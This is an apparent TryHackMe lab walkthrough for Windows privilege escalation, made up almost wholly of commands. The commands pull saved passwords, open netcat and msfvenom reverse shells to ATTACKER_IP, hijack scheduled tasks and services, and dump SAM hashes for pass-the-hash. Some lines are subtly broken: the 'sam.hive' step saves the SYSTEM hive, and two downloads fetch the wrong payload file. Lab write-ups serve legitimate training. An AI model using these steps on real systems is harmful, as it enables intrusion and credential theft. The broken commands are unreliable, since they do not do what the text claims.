## Commands to achieve the flags on TryHackMe - Windows Privilege Escalation.


*Note: I’ll only provide the commands needed to achieve the flags or obtain the results. I won’t share the actual flags—except for those that return a direct response. Tasks that were answered directly in the provided text will not be included here.*

**Task 3**
**A password for the julia.jones user has been left on the Powershell history. What is the password?**

```type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```

**A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?**

```type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString ```

**There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.**

```runas /savecred /user:mike.katz@wprivesc1 cmd.exe  The flag is at c:\users\mike.katz\Desktop```

**Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**

``` reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s ```

**Task 4**
**What is the taskusr1 flag?**
```
schtasks /query /tn vulntask /fo list /v
icacls c:\tasks\schtask.bat
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

nc -lvp 4444 (AttackBox)

schtasks /run /tn vulntask

Go to AttackBox and get the flag at c:\Users\taskusr1\Desktop\
```

**Task 5**
**Get the flag on svcusr1's desktop.**
```
On your Attack Machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server

On your Victim Machine
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe (using PowerShell)
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F

On your Attack Machine
nc -lvp 4445

On your Victim Machine
sc stop windowsscheduler
sc start windowsscheduler

Then, on your attack machine (nc command) you should get cmd prompt on victim machine.

The flag is at svcusr1 Desktop
```


**Get the flag on svcusr2's desktop.**
```
On your Attack Machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
python3 -m http.server

On your Victim Machine
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc2.exe (using PowerShell)
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F

On your Attack Machine
nc -lvp 4446

On your Victim Machine
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"

Then, on your attack machine (nc command) you should get cmd prompt on victim machine.

The flag is at svcusr2 Desktop
```

**Get the flag on the Administrator's desktop.**
```
On your Attack Machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
python3 -m http.server

On your Victim Machine
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc3.exe (using PowerShell)
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

On your Attack Machine
nc -lvp 4447

On your Victim Machine
sc stop THMService
sc start THMService

Then, on your attack machine (nc command) you should get cmd prompt on victim machine.

The flag is at Administrator Desktop
```

**Task 6**
**Get the flag on the Administrator's desktop.**
```
On your Victim Machine
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\system C:\Users\THMBackup\sam.hive

On your Attack Machine
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

On your Victim Machine
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

On your Attack Machine
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL  (get administrator hash)
python3.9 /opt/impacket/examples/psexec.py -hashes <ADMIN_HASH> administrator@MACHINE_IP

The flag is at Administrator Desktop
```
